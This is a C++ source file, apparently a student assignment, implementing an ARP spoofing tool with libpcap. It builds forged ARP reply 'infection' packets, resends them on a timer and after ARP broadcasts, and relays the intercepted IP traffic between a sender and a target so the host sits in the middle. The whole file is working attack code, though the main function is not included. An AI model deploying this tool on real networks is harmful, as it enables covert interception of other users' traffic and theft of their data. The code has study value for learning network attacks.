#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <utility>
#include <map>
#include <algorithm>
#include "ethhdr.h"
#include "arphdr.h"
#include <time.h>
// thread
#include <thread>
#include <signal.h>
#include <assert.h>
// getMyIp
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
//
#define SUCCESS 1
#define FAIL -1


#pragma pack(push, 1) 
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;

	// 복사 생성자
	EthArpPacket() {}
	EthArpPacket(const EthArpPacket& r) { memcpy(&(this->eth_), &(r.eth_), sizeof(EthArpPacket)); }
	
	// 복사 대입 연산자
	EthArpPacket& operator=(const EthArpPacket &r) {
        memcpy(&(this->eth_), &(r.eth_), sizeof(EthArpPacket));
        return *this;
    }
};
#pragma pack(pop)

using std::cout;
using std::ifstream;
using std::string;
using std::cerr;
using std::pair;
using std::vector;
using std::map;
using std::endl;

int exit_flag = 1;
std::vector <EthArpPacket> infectionPacket; // IpTable하고 매칭되도록 index 구성


void sigint_handler(int signo) {
	printf("\ninterrupt\n");
	if(exit_flag == 0) exit(-1); // ctrl+c  2번하면 강제 종료
	else exit_flag = 0; // ctrl+c 1번하면 순차적으로 종료
}

void usage() {
	cout << "syntax : arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]" << endl;
	cout << "sample : arp-spoof wlan0 192.168.10.2 192.168.10.1" << endl;
}

Mac getMyMac(char* dev) {
	//cout << "ttest" << endl;
	// 리눅스의 경우
	// /sys/class/net/[dev]/address
	ifstream fin;
	string path = "/sys/class/net/" + string(dev) +"/address";
	fin.open(path);

	if (fin.fail()) {
		cerr << "Error: " << strerror(errno);
		return Mac::nullMac(); // FAIL이면 null 맥 리턴
	}

	string tmp;
	fin >> tmp;
	fin.close();

	return Mac(tmp);
}

EthArpPacket fillPacket(Mac& smac1, Mac& dmac, Mac& smac2, Ip& sip, Mac& tmac, Ip& tip, uint16_t type) {
	EthArpPacket packet;
	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac1;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(type);
	packet.arp_.smac_ = smac2;
	packet.arp_.sip_ = htonl(sip);
	packet.arp_.tmac_ = tmac;
	packet.arp_.tip_ = htonl(tip);

	return packet;
}

int sendARP(EthArpPacket packet, pcap_t* handle, int times, uint64_t usec) {

	for(int i = 0; i < times; i++) {
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s times=%d\n", res, pcap_geterr(handle), times);
			return FAIL;
		}

		if(i != times-1) usleep(usec); // 마지막에는 sleep 안함
	}
	return SUCCESS;
}

int resolveMac(pcap_t* handle, map<Ip, Mac>& table, Ip& sip, Ip& tip) {
	// table에 있는지 확인
	if(table.find(tip) != table.end()) return SUCCESS;

	EthArpPacket send_packet = fillPacket(table[sip], Mac::broadcastMac(), table[sip], sip, Mac::nullMac(), tip, ArpHdr::Request);
	
	struct pcap_pkthdr* pkheader;
	const u_char* packet;

	// 타이머 구현하는 법
	// 1. 시작 시각하고 현재 시각의 차이를 구한다
	time_t startTime, endTime, counter;
	time(&startTime);
	time(&counter);
	sendARP(send_packet, handle, 1, 0);

	while (exit_flag) {
		time(&endTime);
		// 1초마다 request 보내기
		if(endTime - counter > 1) {
			sendARP(send_packet, handle, 1, 0);
			time(&counter);
		}
		// 10초 지나면 timeout
		if(endTime-startTime > 10) {
			cout << "timeout:: couldn't receive reply packet" << endl;
			return FAIL;
		}

		int res = pcap_next_ex(handle, &pkheader, &packet);
		
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return FAIL;
		}
		
		// ETH-ARP 패킷인지 확인하고 
		EthArpPacket receive_packet;
		memcpy(&receive_packet, packet, 42);
	
		// => ETH의 type정보를 확인
		if(receive_packet.eth_.type_ != htons(EthHdr::Arp)) continue;

		// reply 패킷인지 확인
		if(receive_packet.arp_.op_ != htons(ArpHdr::Reply)) continue;

		// send를 바탕으로 send에 대한 reply인지 확인
		if(send_packet.eth_.smac_ != receive_packet.eth_.dmac_) continue;
		if(send_packet.arp_.smac_ != receive_packet.arp_.tmac_) continue;
		if(send_packet.arp_.sip_ != receive_packet.arp_.tip_) continue;
		if(send_packet.arp_.tip_ != receive_packet.arp_.sip_) continue;

		table.insert({ntohl(receive_packet.arp_.sip_), receive_packet.arp_.smac_});
		break;
	}
	return SUCCESS;
}

Ip getMyIp(char* dev) {
	int fd;
    struct ifreq ifr;
 
    fd = socket(AF_INET, SOCK_DGRAM, 0);
	if(fd < 0) {
		cerr << "Error: " << strerror(errno);
		return FAIL;
	}
    ifr.ifr_addr.sa_family = AF_INET;
   	strncpy(ifr.ifr_name, dev, IFNAMSIZ -1);
    
   	ioctl(fd, SIOCGIFADDR, &ifr);
	if(fd < 0) {
		cerr << "Error: " << strerror(errno);
		return FAIL;
	}
    close(fd);
     
    return Ip(ntohl(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr));
}

int getMyInfo(char* dev, map<Ip, Mac>& table) {
	Mac myMac = getMyMac(dev);
	if(myMac == Mac::nullMac()) return FAIL;
	table.insert({getMyIp(dev), myMac});
	return SUCCESS;
}

int recover(pcap_t* handle, map<Ip, Mac> table, Ip sender, Ip target) {
	return sendARP(fillPacket(table[target], table[sender], table[target], target, table[sender], sender, ArpHdr::Reply), handle, 3, 500);
}

// 쓰레드용
void *infection(void* handle) {
	pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);
	pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS,NULL);
	while(1) {
		for(auto i : infectionPacket) {
			sendARP(i, (pcap_t *)handle , 1, 0);
			usleep(500); // packet loss? 때문에
		}
		sleep(10);
	}
	return NULL;
}

int watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& IpTable, Ip& me) {
	struct pcap_pkthdr* pkheader;
	const u_char* packet;

	while (exit_flag) {
	
		int res = pcap_next_ex(handle, &pkheader, &packet);
		
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return FAIL;
		}

		EthHdr ethHeader;
		memcpy(&ethHeader, packet, 14);
	
		// IP 패킷인지 ARP인지
		// => ETH의 type정보를 확인
		if(ethHeader.type_ == htons(EthHdr::Ip4)) {

			// IP헤더에서 sip랑 dip만 필요함.
			Ip sip, dip;
			
			memcpy(&sip, &packet[14+12], 4);
			memcpy(&dip, &packet[14+16], 4);


			for(auto i : IpTable) {
				// smac이 sender인지
				if(ethHeader.smac_ == ARPtable[i.first]) {

					if(htonl(dip) == me) continue; // 패킷 dest ip가 나
					// 나한테 온걸 나한테 재전송 xx

					u_char* paste_packet = (u_char*)calloc(1, pkheader->len +1);

					memcpy(paste_packet, packet, pkheader->len);
					Mac myMac = ARPtable[me];
					memcpy(paste_packet+6, &myMac, 6);
					Mac tMac = ARPtable[i.second];
					memcpy(paste_packet, &tMac, 6);

					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(paste_packet), pkheader->len + 1);
					
					free(paste_packet);

					if (res != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s len=%d\n", res, pcap_geterr(handle), pkheader->len);
						return FAIL;
					}
					//break;
				}
			}
			continue;
		}
		
		if(ethHeader.type_ != htons(EthHdr::Arp)) continue;


		EthArpPacket header;
		memcpy(&header, packet, sizeof(EthArpPacket));
 


		//cout << "this packet is ARP" << endl;
		// broadcast인지 
		if(header.eth_.dmac_ == Mac::broadcastMac()) { // broadcast인지부터 확인
			for(int i = 0; i < IpTable.size(); i++) {
				// network byte order <-> host byte order
				// 1. sender의 target에 대한 broadcast
				if(ntohl(header.arp_.sip_) == uint32_t(IpTable[i].first) && ntohl(header.arp_.tip_) == uint32_t(IpTable[i].second)) {
					//cout << "case 1" << endl;
					if(sendARP(infectionPacket[i], handle, 2, 500) == FAIL) return FAIL;
				}

				// 2. target의 broadcast
				if(ntohl(header.arp_.sip_) == uint32_t(IpTable[i].second)) {
					//cout << "case 2" << endl;
					if(sendARP(infectionPacket[i], handle, 2, 500) == FAIL) return FAIL;
				}
			}

		}
		// unicast인지
		// 어차피 패킷이 나한테 오기 때문에 
		// relay 안하면 상관없음.
		else {
			for(int i = 0 ; i < IpTable.size(); i++) {
				// 3. sender -> target unicast
				if(ntohl(header.arp_.sip_) == IpTable[i].first && ntohl(header.arp_.tip_) == IpTable[i].second) {
					//cout << "case 3" << endl;
					//sendARP(infectionPacket[i], handle, 2, 500);
				}
			}
			
		}

		// 4. target -> sender unicast => 인자를 2쌍 이상 받아서 처리하는 이유
		// target sender 둘다 감염 시키면 
		// 4에 해당하는 것이 case 3에 잡힙
		// 어차피 arp는 relay하지 않기 때문에 sender한테 unicast 전달이 안됨.
	}
	return SUCCESS;
}

void initArg(char* argv[], Ip& sender, Ip& target) {
	sender = Ip(string(argv[0]));
	target = Ip(string(argv[1]));
}
